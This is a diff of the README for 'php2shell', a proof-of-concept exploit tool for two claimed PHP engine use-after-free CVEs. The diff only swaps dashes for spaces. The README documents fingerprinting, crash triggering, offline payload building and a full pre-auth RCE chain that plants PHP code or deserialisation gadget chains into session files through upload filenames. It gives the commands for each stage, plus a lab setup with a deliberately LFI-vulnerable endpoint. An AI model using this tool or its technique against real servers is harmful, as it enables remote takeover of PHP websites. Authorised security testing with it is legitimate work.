@@ -1,12 +1,12 @@
 # php2shell PoC
 
-Proof-of-concept for **CVE-2026-109618** and **CVE-2026-109619** — two critical use-after-free vulnerabilities in the PHP engine's `session.upload_progress` handler and Zend HashTable internals. CVSS v4.0 **9.2**. Pre-auth. Affects PHP 5.4.0 through 8.5.11.
+Proof-of-concept for **CVE-2026-109618** and **CVE-2026-109619**  two critical use-after-free vulnerabilities in the PHP engine's `session.upload_progress` handler and Zend HashTable internals. CVSS v4.0 **9.2**. Pre-auth. Affects PHP 5.4.0 through 8.5.11.
 
 For authorised security testing and educational purposes only.
 
 ## Background
 
-Both flaws are in the PHP engine itself, not in any application code. Any PHP endpoint — WordPress, Drupal, Laravel, custom apps — is a valid trigger target. `session.upload_progress` runs on every `multipart/form-data` POST **before** application code, even without `session_start()`.
+Both flaws are in the PHP engine itself, not in any application code. Any PHP endpoint  WordPress, Drupal, Laravel, custom apps is a valid trigger target. `session.upload_progress` runs on every `multipart/form-data` POST **before** application code, even without `session_start()`.
 
 | CVE | Name | Bug class | Impact |
 |-----|------|-----------|--------|
@@ -21,7 +21,7 @@ Both flaws are in the PHP engine itself, not in any application code. Any PHP en
 | 8.4 | 8.4.27 |
 | 8.3 | 8.3.36 |
 | 8.2 | 8.2.35 |
-| 8.1 and older | EOL — no official fix. Disable `session.upload_progress.enabled` |
+| 8.1 and older | EOL   no official fix. Disable `session.upload_progress.enabled` |
 
 ## Requirements
 
@@ -32,7 +32,7 @@ Both flaws are in the PHP engine itself, not in any application code. Any PHP en
 
 The tool has four modes: `check`, `trigger`, `build`, and `rce`.
 
-### check — Passive version fingerprint
+### check   Passive version fingerprint
 
 Reads the `X-Powered-By` header and response body to extract the PHP version, then classifies it against the patched releases.
 
@@ -48,9 +48,9 @@ python3 php2shell_poc.py check -f hosts.txt -o results.jsonl -v
 
 **Exit codes**: 0 = no vulnerable hosts, 1 = all unreachable/empty input, 2 = one or more vulnerable
 
-### trigger — Active vulnerability trigger
+### trigger   Active vulnerability trigger
 
-Sends `multipart/form-data` POST requests that exercise the vulnerable code paths. Does **not** attempt RCE on its own — it confirms the target is vulnerable by observing OOM errors, memory leaks, or worker crashes.
+Sends `multipart/form-data` POST requests that exercise the vulnerable code paths. Does **not** attempt RCE on its own   it confirms the target is vulnerable by observing OOM errors, memory leaks, or worker crashes.
 
 ```bash
 # CVE-2026-109618: OOM trigger via oversized field names
@@ -70,9 +70,9 @@ python3 php2shell_poc.py trigger \
 ```
 
 **Flags in output**:
-- `OOM` — "Allowed memory size exhausted" in response (109618 confirmed)
-- `LEAK` — high non-ASCII byte count in response body (memory disclosure)
-- `CRASH` — remote disconnect / worker segfault
+- `OOM`   "Allowed memory size exhausted" in response (109618 confirmed)
+- `LEAK`   high non-ASCII byte count in response body (memory disclosure)
+- `CRASH`   remote disconnect / worker segfault
 
 **Key options**:
 
@@ -85,7 +85,7 @@ python3 php2shell_poc.py trigger \
 | `--payload-filename` | serialised-object probe | Custom filename for upload-progress injection |
 | `--delay` | 0.5 | Seconds between rounds |
 
-### build — Offline body dump
+### build   Offline body dump
 
 Writes the trigger request body to a local file for manual replay with `curl` or Burp. No network traffic.
 
@@ -100,7 +100,7 @@ curl -X POST \
     http://target.local/index.php
 ```
 
-### rce — Full RCE chain
+### rce   Full RCE chain
 
 Chains CVE-2026-109619 session planting with a second-stage trigger for code execution. Two methods are supported.
 
@@ -149,7 +149,7 @@ Step 2: INCLUDE (GET to LFI-vulnerable endpoint)
 
 #### Method 2: Deserialization handler mismatch
 
-Plants a serialised PHP gadget chain into the session file. Exploits a `php_serialize` (writer) vs `php` (reader) handler mismatch: the pipe character `|` in the filename terminates the session key, and the rest is deserialised as a value. No LFI required — fires on any `session_start()`.
+Plants a serialised PHP gadget chain into the session file. Exploits a `php_serialize` (writer) vs `php` (reader) handler mismatch: the pipe character `|` in the filename terminates the session key, and the rest is deserialised as a value. No LFI required   fires on any `session_start()`.
 
 ```bash
 # Generate a gadget chain with phpggc
@@ -165,19 +165,19 @@ python3 php2shell_poc.py rce \
 
 ## RCE chain explained
 
-### Chain A — CVE-2026-109619 + LFI / deserialization (this tool)
+### Chain A   CVE-2026-109619 + LFI / deserialization (this tool)
 
 The most practical path. `session.upload_progress` writes the upload filename into the session file **without sanitization**. The attacker controls three things:
 
-1. **Session ID** — fixed via a `PHPSESSID` form field (not just a cookie), giving a predictable session file path
-2. **Filename** — written verbatim, can contain PHP code or serialised-object syntax
-3. **Timing** — upload-progress runs before application code, on any endpoint
+1. **Session ID**   fixed via a `PHPSESSID` form field (not just a cookie), giving a predictable session file path
+2. **Filename**   written verbatim, can contain PHP code or serialised-object syntax
+3. **Timing**   upload-progress runs before application code, on any endpoint
 
 RCE completes through either:
 - **LFI inclusion** of the session file (the planted PHP tag executes)
 - **Deserialization mismatch** when the app's `session_start()` reads the poisoned session under a different serialisation handler
 
-### Chain B — CVE-2026-109618 memory leak + ASLR bypass + UAF (not in this tool)
+### Chain B   CVE-2026-109618 memory leak + ASLR bypass + UAF (not in this tool)
 
 Harder, requires target-specific binary offsets:
 
@@ -198,12 +198,12 @@ A minimal test environment using PHP's built-in server:
 mkdir -p lab/webroot lab/sessions
 
 # Minimal PHP endpoint
-echo '<?php echo "OK — PHP/" . PHP_VERSION . "\n"; ?>' > lab/webroot/index.php
+echo '<?php echo "OK   PHP/" . PHP_VERSION . "\n"; ?>' > lab/webroot/index.php
 
 # LFI-vulnerable endpoint (simulates common plugin/template bugs)
 echo '<?php $page = $_GET["page"] ?? "default"; include($page); ?>' > lab/webroot/vuln_lfi.php
 
-# php.ini — low memory_limit to make OOM triggerable with smaller payloads
+# php.ini   low memory_limit to make OOM triggerable with smaller payloads
 cat > lab/php.ini << 'EOF'
 memory_limit = 8M
 post_max_size = 50M
